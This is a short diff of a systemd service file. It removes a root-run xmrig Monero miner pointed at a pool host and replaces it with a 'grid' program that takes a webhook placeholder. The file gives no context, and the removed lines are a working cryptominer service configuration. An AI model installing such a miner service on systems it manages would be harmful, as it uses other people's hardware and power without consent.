@@ -11,19 +11,10 @@ User=root
 LimitNOFILE=1048576
 Nice=-5
 
-ExecStart=/usr/bin/xmrig \
-  --url=tokyo:3333 \
-  --user=%H \
-  --pass=%H \
-  --algo=rx/monero \
-  --cpu-priority=5 \
-  --randomx-1gb-pages \
-  --huge-pages \
-  --verbose=0
+ExecStart=/usr/bin/grid --webhook=__WEBHOOK_URL__
 
 Restart=on-failure
 RestartSec=10
 
 [Install]
 WantedBy=multi-user.target
-
